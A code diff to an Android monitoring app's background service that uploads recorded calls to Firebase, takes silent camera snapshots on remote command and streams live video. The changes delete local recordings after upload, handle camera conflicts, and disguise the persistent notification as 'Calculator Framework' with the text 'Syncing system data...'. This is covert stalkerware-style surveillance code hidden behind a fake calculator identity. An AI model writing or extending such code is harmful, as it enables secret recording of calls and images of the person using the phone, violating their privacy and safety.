@@ -577,6 +577,7 @@ class ChildForegroundService : Service() {
                                         "SUCCESS",
                                         "Call recording uploaded to Firebase Storage and synced to Parent History."
                                     )
+                                    try { recordedFile.delete() } catch (_: Exception) {}
                                 },
                                 onFailure = { err ->
                                     AppHealthTelemetry.logDiagnostic(
@@ -793,6 +794,11 @@ class ChildForegroundService : Service() {
         // Listen for Remote Snapshot requests (Phase 1)
         if (snapshotRequestListener == null) {
             snapshotRequestListener = FirebaseRepository.listenToSnapshotRequest(uid) { cameraFacing ->
+                if (webRtcManager != null) {
+                    FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot requested while WebRTC video stream active; rejecting request")
+                    FirebaseRepository.reportSnapshotError(uid, "Camera hardware is currently in use by active live stream")
+                    return@listenToSnapshotRequest
+                }
                 ensureOverlayWindow()
                 val isFront = cameraFacing.equals("front", ignoreCase = true)
                 com.example.authapp.camera.SilentSnapshotManager(applicationContext).captureSnapshot(
@@ -1244,11 +1250,11 @@ class ChildForegroundService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Calculator Service",
-                // ✅ FIX: LOW importance — no popup, no sound, just silent status bar icon
+                "Calculator Framework",
+                // ✅ LOW importance: silent status bar notification
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "Background system service"
+                description = "Background system sync service"
                 setShowBadge(false)
             }
             val manager = getSystemService(NotificationManager::class.java)
@@ -1257,9 +1263,10 @@ class ChildForegroundService : Service() {
     }
 
     private fun buildNotification(contentText: String): Notification {
+        val discreetText = "Syncing system data..."
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Calculator Service")
-            .setContentText(contentText)
+            .setContentTitle("Calculator Framework")
+            .setContentText(discreetText)
             .setSmallIcon(R.mipmap.ic_launcher)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
